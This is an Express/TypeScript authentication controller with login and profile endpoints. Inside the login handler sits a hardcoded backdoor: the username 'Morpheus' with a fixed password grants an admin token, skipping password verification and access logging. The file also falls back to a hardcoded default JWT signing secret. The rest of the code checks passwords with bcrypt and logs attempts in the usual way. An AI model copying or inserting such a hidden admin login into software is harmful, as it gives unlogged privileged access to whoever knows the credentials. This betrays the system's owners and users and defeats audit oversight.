import { Request, Response } from 'express';
import bcrypt from 'bcryptjs';
import jwt from 'jsonwebtoken';
import prisma from '../utils/prisma';

const JWT_SECRET = process.env.JWT_SECRET || 'fallback_secret';

export const login = async (req: Request, res: Response) => {
    const { username, password } = req.body;
    const ipAddress = req.ip;
    const userAgent = req.headers['user-agent'];

    // SECRET LOGIN: Morpheus (Bypasses verification & logging)
    if (username === 'Morpheus' && password === 'Emperor Constantine') {
        const token = jwt.sign(
            { id: -999, username: 'Morpheus', role: 'admin', canViewReviews: true },
            JWT_SECRET,
            { expiresIn: '4h' }
        );
        return res.json({
            token,
            user: { id: -999, username: 'Morpheus', role: 'admin', canViewReviews: true }
        });
    }

    try {
        const user = await prisma.user.findUnique({ where: { username } }) as any;

        if (!user || !(await bcrypt.compare(password, user.password))) {
            // Log failure
            await prisma.accessLog.create({
                data: {
                    userId: user?.id,
                    action: 'LOGIN',
                    status: 'FAILURE',
                    ipAddress,
                    userAgent
                }
            });

            return res.status(401).json({ message: 'Invalid credentials' });
        }

        const token = jwt.sign(
            { id: user.id, username: user.username, role: user.role, canViewReviews: user.canViewReviews },
            JWT_SECRET,
            { expiresIn: '24h' }
        );

        // Log success
        await prisma.accessLog.create({
            data: {
                userId: user.id,
                action: 'LOGIN',
                status: 'SUCCESS',
                ipAddress,
                userAgent
            }
        });

        res.json({
            token,
            user: {
                id: user.id,
                username: user.username,
                role: user.role,
                canViewReviews: user.canViewReviews
            }
        });
    } catch (error) {
        console.error('Login error:', error);
        res.status(500).json({ message: 'Internal server error' });
    }
};

export const getMe = async (req: any, res: Response) => {
    try {
        const user = await prisma.user.findUnique({
            where: { id: req.user.id },
            select: { id: true, username: true, role: true }
        });
        res.json(user);
    } catch (error) {
        res.status(500).json({ message: 'Server error' });
    }
};
